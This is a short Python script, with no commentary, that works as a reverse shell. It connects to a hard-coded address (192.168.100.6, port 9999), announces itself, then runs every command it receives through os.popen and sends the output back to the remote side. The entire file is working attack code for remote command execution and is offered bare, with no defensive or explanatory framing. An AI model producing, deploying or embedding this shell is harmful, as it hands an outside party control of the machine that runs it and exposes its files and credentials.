#!/usr/bin/python
import socket, os

rhost = '192.168.100.6'
rport = 9999

def _shell_():
	user = os.getlogin()
	while True:
		s.send(user + "$" )
		data = s.recv(1024)
		if 'exit' in data:
			break
		else:
			out = ''
			result = os.popen(data).readlines()
			for i in range(len(result)):
				out += result[i]
			s.send(out)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((rhost, rport))
s.send("Connected\n")
_shell_()


s.close()
